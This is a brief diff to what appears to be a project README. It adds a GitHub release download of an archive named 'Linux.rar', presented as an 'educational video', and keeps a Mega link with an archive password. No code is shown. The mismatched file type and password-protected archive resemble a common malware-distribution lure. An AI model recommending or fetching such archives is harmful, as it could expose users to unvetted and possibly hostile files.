@@ -18,8 +18,9 @@
 ### Full Educational Video  
 برای مشاهده آموزش کامل، می‌توانید از لینک زیر استفاده کنید:  
 
-**[Download Educational Video](https://mega.nz/file/78YzyD7S)**  
-**Password:**  
+**[Download Educational Video From Github](https://github.com/vergoboyy/mmd/releases/download/untagged-1454904ee2622433dde7/Linux.rar)**  
+**[Download Educational Video Mega](https://mega.nz/file/78YzyD7S)**  
+**Password Mega:**  
 ```
 L2L235bpealDAitympqpBYELJoK58Im21MPRsjmFRGM
 ```
